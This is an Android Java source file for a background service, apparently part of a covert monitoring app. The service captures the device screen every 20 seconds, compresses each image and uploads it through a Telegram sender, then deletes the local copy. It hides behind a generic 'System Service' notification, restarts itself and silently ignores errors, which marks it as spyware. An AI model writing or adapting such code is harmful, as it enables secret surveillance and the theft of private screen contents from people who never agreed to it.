package com.tom5.monitor;

import android.app.*;
import android.content.Intent;
import android.graphics.*;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.*;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

public class ScreenService extends Service {
    private MediaProjection mp;
    private ImageReader ir;
    private Handler h = new Handler(Looper.getMainLooper());

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotify();
        if (intent != null && intent.hasExtra("resData")) {
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            mp = mpm.getMediaProjection(intent.getIntExtra("resCode", -1), (Intent) intent.getParcelableExtra("resData"));
            
            DisplayMetrics m = new DisplayMetrics();
            ((WindowManager) getSystemService(WINDOW_SERVICE)).getDefaultDisplay().getMetrics(m);
            ir = ImageReader.newInstance(m.widthPixels/2, m.heightPixels/2, PixelFormat.RGBA_8888, 2);
            mp.createVirtualDisplay("Cap", m.widthPixels/2, m.heightPixels/2, m.densityDpi, 16, ir.getSurface(), null, null);

            h.postDelayed(new Runnable() {
                @Override public void run() {
                    capture();
                    h.postDelayed(this, 20000);
                }
            }, 5000);
        }
        return START_STICKY;
    }

    private void capture() {
        try (Image img = ir.acquireLatestImage()) {
            if (img == null) return;
            Image.Plane[] planes = img.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            Bitmap b = Bitmap.createBitmap(img.getWidth(), img.getHeight(), Bitmap.Config.ARGB_8888);
            b.copyPixelsFromBuffer(buffer);
            File f = new File(getCacheDir(), "t.jpg");
            try (FileOutputStream out = new FileOutputStream(f)) {
                b.compress(Bitmap.CompressFormat.JPEG, 30, out);
                TelegramSender.sendPhoto(f);
                f.delete();
            }
            b.recycle();
        } catch (Exception ignored) {}
    }

    private void createNotify() {
        NotificationChannel c = new NotificationChannel("c", "Sys", NotificationManager.IMPORTANCE_LOW);
        getSystemService(NotificationManager.class).createNotificationChannel(c);
        startForeground(1, new NotificationCompat.Builder(this, "c").setContentTitle("System Service").setSmallIcon(android.R.drawable.ic_menu_info_details).build());
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
